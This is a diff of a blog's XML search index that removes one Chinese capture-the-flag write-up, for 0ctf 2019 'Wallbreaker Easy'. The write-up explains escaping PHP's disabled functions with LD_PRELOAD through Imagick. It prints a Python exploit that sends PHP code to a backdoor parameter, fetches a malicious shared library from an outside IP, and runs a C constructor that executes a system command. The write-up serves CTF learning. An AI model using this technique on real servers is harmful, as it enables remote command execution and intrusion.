@@ -111,29 +111,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>0ctf 2019 web Wallbreaker Easy</title>
-    <url>/2019/04/22/0ctf-2019-web-Wallbreaker-Easy/</url>
-    <content><![CDATA[<h2 id="前言：菜是原罪">前言：菜是原罪</h2>
-<p>这道题目参考了小西师傅、一叶飘零和郭dalao学长的分享,真实地感觉自己的菜了。。。</p>
-<p>在写脚本的过程中遇见了很多诡异的问题，先留着琢磨。</p>
-<h2 id="主要思路">主要思路</h2>
-<p>利用<code>Imagick()</code>中会触发<code>php解释器向外开启系统进程</code>的方法，这里的思路是当传入<code>MPEG</code>格式类型的文件时候，为了转换格式会向外部环境请求并触发<code>ffmpeg</code>的调用，从而开启新的进程。在开启时，环境变量<code>LD_PRELOAD</code>会首先加载，而我们事先会将我们的<code>恶意共享文件hack.so在这个环境变量中指出来</code>，即<code>LD_PRELOAD={DIR}/hack.so</code>。hack.so共享文件由hack.c文件编译，其中调用了<code>__attribute__((constructor))</code>，该方法会在共享文件被加载的时候率先被执行，至于执行的代码，当然就是<code>/readflag &gt; {dir}/flag</code>啦。主要代码如下，代码写法借鉴了郭大佬的脚本，虽然思路不一样，个人感觉dalao的思路更加直接明了。</p>
-<p>脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://111.186.63.208:31340/"</span></span><br><span class="line">dir = <span class="string">"/tmp/ef757c06e983a137384378f47607abfa"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#the first time i do this ,i use format function 'format' to replace $dir but failed,then i used $dir and '%',worked ,after the flag went out ,the format problem seems to dispeare?</span></span><br><span class="line"><span class="comment">#the new Imagick('&#123;filename&#125;') beginning with no work,but didnot after replace'''to '"',also disapeared after sovled it</span></span><br><span class="line">cmd = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;pre&gt;hello???????&lt;br&gt;&lt;?php echo 'hello';?&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$dir = "&#123;0&#125;";</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/hack.so",file_get_contents("http://207.148.64.125:80/hack.so"));</span></span><br><span class="line"><span class="string">chmod("&#123;0&#125;/hack.so",0777);</span></span><br><span class="line"><span class="string">putenv("LD_PRELOAD=&#123;0&#125;/hack.so");</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/ch4ser.wmv","sssss");</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/ch4ser","");</span></span><br><span class="line"><span class="string">$tocken = new Imagick('&#123;0&#125;/ch4ser.wmv');</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">'''</span>.format(dir)</span><br><span class="line"></span><br><span class="line"><span class="comment">#why the command line been executed can not be more than 2 in my script?cause the include will cause error</span></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">file_put_contents('%s/evil',base64_decode("%s"));</span></span><br><span class="line"><span class="string">include "%s/evil";</span></span><br><span class="line"><span class="string">'''</span>%(dir,base64.b64encode(cmd),dir)</span><br><span class="line"></span><br><span class="line">print(requests.post(url, data=&#123;<span class="string">'backdoor'</span>: payload &#125;).content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'backdoor'</span>:<span class="string">"print_r(scandir('%s'));"</span>%dir&#125;).content</span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'backdoor'</span>:<span class="string">"echo file_get_contents('%s/ch4ser');"</span>%dir&#125;).content</span><br></pre></td></tr></table></figure>
-<p>脚本写得很烂，注释部分可以忽略，是我在写的过程中遇到的小问题。</p>
-<p>然后服务器上面的<code>hack.c</code>文件如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/ch4ser"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>使用命令<code>gcc --share -fPIC hack.c -o hack.so</code>命令来编译共享文件。在服务器目录下面开启<code>python -m SimpleHTTPServer 80</code>，并运行上述python脚本，即可看到flag。</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/55161547-c39d6480-51a0-11e9-9f1c-f01618558228.png" alt="flag"></p>
-<blockquote>
-<p>ps:每个人的目录会不定时被服务器清空</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>无法归类的神级题目</category>
-      </categories>
-  </entry>
-  <entry>
     <title>copperstudy-record</title>
     <url>/2019/12/19/qwb-copperstudy-record/</url>
     <content><![CDATA[<h2 id="强网杯-2019-copperstudy">强网杯 2019 copperstudy</h2>
